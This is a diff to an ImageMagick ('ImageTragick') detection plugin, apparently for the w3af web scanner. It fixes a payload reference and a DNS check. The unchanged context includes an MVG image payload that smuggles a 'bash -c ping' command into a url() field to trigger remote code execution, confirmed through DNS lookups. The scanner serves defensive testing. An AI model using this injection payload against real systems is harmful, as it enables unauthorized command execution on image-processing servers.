@@ -28,7 +28,7 @@ push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://{detect}"|bash -c "ping {rce})'
 pop graphic-context
-	'''
+'''
 
 	def __init__(self):
 		AuditPlugin.__init__(self)
@@ -42,7 +42,7 @@ pop graphic-context
 
 		self.fqdn_imagemagic_exist = "im.{target}.{domain}".format( target=freq.get_uri().get_domain(), domain=self._dns_zone )
 		self.fqdn_imagemagic_vuln = "rce.{target}.{domain}".format( target=freq.get_uri().get_domain(), domain=self._dns_zone )
-		PAYLOAD = PAYLOAD.format( detect=self.fqdn_imagemagic_exist, rce=self.fqdn_imagemagic_vuln )
+		PAYLOAD = imagemagic.PAYLOAD.format( detect=self.fqdn_imagemagic_exist, rce=self.fqdn_imagemagic_vuln )
 		for mutant in create_mutants(freq, [PAYLOAD, ]):
 			if isinstance(mutant, FileContentMutant):
 				try:
@@ -72,7 +72,7 @@ pop graphic-context
 					om.out.debug( str(e) )
 
 	def check(self, fqdn):
-		return self._resolver.query(fqdn) == []
+		return self._resolver.query(fqdn) != []
 
 	def get_options(self):
 		"""
